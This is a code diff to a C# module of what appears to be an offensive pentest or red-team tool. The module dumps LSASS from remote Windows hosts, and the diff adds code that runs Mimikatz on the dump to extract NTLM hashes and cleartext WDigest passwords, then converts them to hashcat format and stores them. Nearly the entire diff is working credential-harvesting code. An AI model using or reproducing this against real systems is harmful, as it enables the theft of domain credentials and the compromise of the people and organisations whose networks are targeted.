@@ -71,11 +71,84 @@ namespace ElCazador.Worker.Modules.Tools
                 dumpFilePath);
 
             await Controller.Log(Name, "Dumped LSASS from {0} ({1}) using the user: {2}\\{3}", target.Hostname, target.IP, user.Domain, user.Username);
+
+            await RunMimikatz(dumpFilePath);
+        }
+
+        private async Task RunMimikatz(string dumpFilePath)
+        {
+            var result = await ProcessStarter.Start(
+                Controller.WorkerSettings.MimikatzExecutable,
+                string.Format("\"sekurlsa::minidump {0}\" \"sekurlsa::logonPasswords\" \"exit\"", dumpFilePath));
+
+            await Controller.Log(Name, result.ResultOutput);
+            await ParseMimikatzOutput(result.ResultOutput);
+        }
+
+        private async Task ParseMimikatzOutput(string output)
+        {
+            var splitted = output.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
+
+            for (int i = 0; i < splitted.Length; i++)
+            {
+                var line = splitted[i];
+
+                if (line.Contains("msv :"))
+                {
+
+                    if (await ParseMimikatzLine(splitted[i + 4]) == "(null)" || !splitted[i + 4].Contains("NTLM"))
+                    {
+                        continue;
+                    }
+
+                    var user = new User
+                    {
+                        Username = await ParseMimikatzLine(splitted[i + 2]),
+                        Domain = await ParseMimikatzLine(splitted[i + 3]),
+                        Hash = await ParseMimikatzLine(splitted[i + 4]),
+                        PasswordType = "NTLM"
+                    };
+
+                    user.HashcatFormat = string.Format("{0}:{1}", user.Username, user.Hash);
+
+                    await Controller.Add(Name, user);
+                }
+                else if (line.Contains("wdigest :"))
+                {
+                    if (await ParseMimikatzLine(splitted[i + 3]) == "(null)" || !splitted[i + 3].Contains("Password"))
+                    {
+                        continue;
+                    }
+
+                    var user = new User
+                    {
+                        Username = await ParseMimikatzLine(splitted[i + 1]),
+                        Domain = await ParseMimikatzLine(splitted[i + 2]),
+                        Hash = await ParseMimikatzLine(splitted[i + 3]),
+                        HashcatFormat = "",
+                        PasswordType = "ClearText"
+                    };
+
+                    await Controller.Add(Name, user);
+                }
+            }
+        }
+
+        private async Task<string> ParseMimikatzLine(string line)
+        {
+            int index = line.IndexOf(":");
+
+            if (index < 0)
+            {
+                await Controller.Log(Name, "Something wrong with mimikatz parsing: {0}", line);
+            }
+
+            return line.Substring(index + 2);
         }
 
         private async Task<bool> RunProcess(Target target, User user, string command, Func<Target, User, string, string> getArguments)
         {
-            var result = await ProcessStarter.Start("python", getArguments(target, user, command));
+            var result = await ProcessStarter.Start(Controller.WorkerSettings.PythonExecutable, getArguments(target, user, command));
 
             await Controller.Log(Name, result.ResultOutput);
 
